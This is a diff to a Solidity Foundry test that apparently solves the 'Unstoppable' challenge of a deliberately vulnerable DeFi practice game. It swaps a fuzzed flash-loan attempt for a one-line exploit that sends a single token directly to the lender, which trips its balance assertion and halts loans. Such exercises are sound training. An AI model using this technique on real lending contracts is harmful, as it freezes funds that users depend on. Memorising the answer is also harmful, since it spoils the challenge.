@@ -54,23 +54,14 @@ contract Unstoppable is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit(uint96 amount, uint96 loan) public {
-        vm.assume(amount > 0.1 ether);
-        vm.assume(amount <= INITIAL_ATTACKER_TOKEN_BALANCE);
-        vm.assume(loan <= TOKENS_IN_POOL && loan > 1);
+    function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
-        );
-        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
-        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
-        unstoppableLender.depositTokens(amount);
-        receiverUnstoppable.executeFlashLoan(loan);
+        dvt.transfer(address(unstoppableLender), 1);
         vm.stopPrank();
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
-        //validation();
+        validation();
     }
 
     function validation() internal {
